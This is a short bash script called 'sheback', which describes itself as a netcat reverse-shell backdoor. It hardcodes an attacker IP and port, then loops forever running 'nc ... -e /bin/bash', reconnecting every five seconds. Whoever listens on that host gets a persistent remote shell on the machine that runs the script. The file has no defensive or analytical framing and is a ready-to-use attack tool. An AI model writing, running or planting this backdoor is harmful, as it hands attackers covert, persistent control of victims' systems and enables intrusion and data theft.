#! /bin/bash
# @author : allannjuguna 
# @title  :   sheback (ShellBackdoor)
# @description : This is a simple netcat reverseshell backdoor
# @notes 	   : Hardcode the ip and port or get them via github



ip="192.168.8.118" #attacker ip
port="5050"	# attacker port
timeout=5
shell="/bin/bash"
while true;do
	echo -e "[*] Reverse connecting to tcp://$ip:$port"
	nc $ip $port -e $shell && echo -e "[+] Connected " 2>/dev/null
	echo -e "[-] Reconnecting ... "
	sleep $timeout
	clear
done
